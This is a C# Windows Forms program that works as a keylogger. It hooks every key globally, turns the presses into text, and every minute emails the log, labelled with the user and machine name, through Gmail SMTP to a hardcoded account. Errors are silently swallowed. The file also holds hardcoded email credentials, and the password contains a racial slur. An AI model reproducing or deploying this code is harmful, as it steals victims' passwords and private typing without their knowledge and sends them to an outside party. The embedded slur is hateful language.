using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using Utilities;
using System.Net;
using System.Net.Mail;

namespace client
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        globalKeyboardHook g = new globalKeyboardHook();
        bool capped;
        Thread initial;
        Thread c;
        private void Form1_Load(object sender, EventArgs e)
        {
            g.hook();
            CheckForIllegalCrossThreadCalls = false;
            initial = new Thread(Initialize);
            initial.IsBackground = true;
            initial.Start();
        }

        void Initialize()
        {
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
            { g.HookedKeys.Add(key); }
            g.KeyDown += g_KeyDown;
            g.KeyUp += g_KeyUp;
            c = new Thread(Cycle);
            c.IsBackground = true;
            c.Start();
        }

        void g_KeyUp(object sender, KeyEventArgs e)
        {
            switch (e.KeyCode)
            {
                case Keys.LShiftKey:
                    capped = false;
                    break;
                case Keys.RShiftKey:
                    capped = false;
                    break;
            }
        }

        void g_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                string key = string.Empty;
                switch (e.KeyCode)
                {
                    case Keys.LShiftKey:
                        capped = true;
                        key = "[SHIFT]";
                        break;
                    case Keys.RShiftKey:
                        capped = true;
                        key = "[SHIFT]";
                        break;
                    case Keys.Oemcomma:
                        key = ",";
                        if (capped) { key = "<"; }
                        break;
                    case Keys.OemPeriod:
                        key = ".";
                        if (capped) { key = ">"; }
                        break;
                    case Keys.OemQuestion:
                        key = "/";
                        if (capped) { key = "?"; }
                        break;
                    case Keys.Oem1:
                        key = ";";
                        if (capped) { key = ":"; }
                        break;
                    case Keys.Oem7:
                        key = "'";
                        if (capped) { key = "\""; }
                        break;
                    case Keys.OemOpenBrackets:
                        key = "[";
                        if (capped) { key = "{"; }
                        break;
                    case Keys.Oem6:
                        key = "]";
                        if (capped) { key = "}"; }
                        break;
                    case Keys.Oem5:
                        key = "\\";
                        if (capped) { key = "|"; }
                        break;
                    case Keys.D1:
                        key = "1";
                        if (capped) { key = "!"; }
                        break;
                    case Keys.D2:
                        key = "2";
                        if (capped) { key = "@"; }
                        break;
                    case Keys.D3:
                        key = "3";
                        if (capped) { key = "#"; }
                        break;
                    case Keys.D4:
                        key = "4";
                        if (capped) { key = "$"; }
                        break;
                    case Keys.D5:
                        key = "5";
                        if (capped) { key = "%"; }
                        break;
                    case Keys.D6:
                        key = "6";
                        if (capped) { key = "^"; }
                        break;
                    case Keys.D7:
                        key = "7";
                        if (capped) { key = "&"; }
                        break;
                    case Keys.D8:
                        key = "8";
                        if (capped) { key = "*"; }
                        break;
                    case Keys.D9:
                        key = "9";
                        if (capped) { key = "("; }
                        break;
                    case Keys.D0:
                        key = "0";
                        if (capped) { key = ")"; }
                        break;
                    case Keys.OemMinus:
                        key = "-";
                        if (capped) { key = "_"; }
                        break;
                    case Keys.Oemplus:
                        key = "=";
                        if (capped) { key = "+"; }
                        break;
                    case Keys.Back:
                        key = "[BACK]";
                        break;
                    case Keys.LControlKey:
                        key = "[CTRL]";
                        break;
                    case Keys.RControlKey:
                        key = "[CTRL]";
                        break;
                    case Keys.Return:
                        key = "\n[ENTER]\n";
                        break;
                    case Keys.LMenu:
                        key = "[ALT]";
                        break;
                    case Keys.RMenu:
                        key = "[ALT]";
                        break;
                    case Keys.Oemtilde:
                        key = "`";
                        if (capped) { key = "~"; }
                        break;
                    case Keys.LWin:
                        key = "[WIN]";
                        break;
                    case Keys.RWin:
                        key = "[WIN]";
                        break;
                    case Keys.Capital:
                        key = "[CAPS]";
                        if (capped) { capped = false; }
                        if (capped == false) { capped = true; }
                        break;
                    case Keys.Space:
                        key = " ";
                        break;
                    case Keys.Delete:
                        key = "[DEL]";
                        break;
                }
                if (key == string.Empty)
                {
                    if (capped) { textBox1.AppendText(e.KeyCode.ToString()); }
                    if (capped == false) { textBox1.AppendText(e.KeyCode.ToString().ToLower()); }
                }
                else
                {
                    textBox1.AppendText(key);
                }
            }
            catch { }
        }

        void Send()
        {
            try
            {
                NetworkCredential creds = new NetworkCredential("leontosy@gmail.com", "ihateniggers90");
                MailMessage mail = new MailMessage();
                mail.To.Add("leontosy@gmail.com");
                mail.From = new MailAddress("leontosy@gmail.com");
                mail.Subject = Environment.UserName + "@" + Environment.MachineName + " Logs";
                mail.Body = textBox1.Text;

                SmtpClient client = new SmtpClient("smtp.gmail.com", 25);
                client.Credentials = creds;
                client.EnableSsl = true;
                client.Send(mail);
            }
            catch { }

        }

        void Cycle()
        {
            while (true)
            {
                Thread.Sleep(60000);
                Send();
            }
        }
    }
}
